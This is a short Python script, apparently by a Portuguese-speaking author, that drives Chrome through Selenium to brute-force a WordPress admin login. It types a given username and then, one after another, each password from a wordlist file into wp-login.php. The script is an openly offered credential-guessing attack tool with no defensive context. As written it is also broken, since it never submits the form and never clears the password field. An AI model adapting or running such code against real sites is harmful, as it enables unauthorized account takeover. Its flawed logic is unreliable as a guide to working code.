#!/usr/bin/env python
# CRIADO POR ERIC RODRIGUES


import time, webbrowser, socket
from selenium import webdriver 

driver = webdriver.Chrome()
driver.get("http://site.com/wp-login.php")

admin = input("Digite o admin: ")
senha = input("Digite o caminho do arquivo: ")


colocaAdmin = driver.find_element_by_id("user_login")
colocaAdmin.send_keys(admin) 

with open(senha) as file:
    for line in file:
        print("Testando -> {}".format(line))
        colocaAdmin = driver.find_element_by_id("user_pass")
        colocaAdmin.send_keys(line)
        time.sleep(1)
        

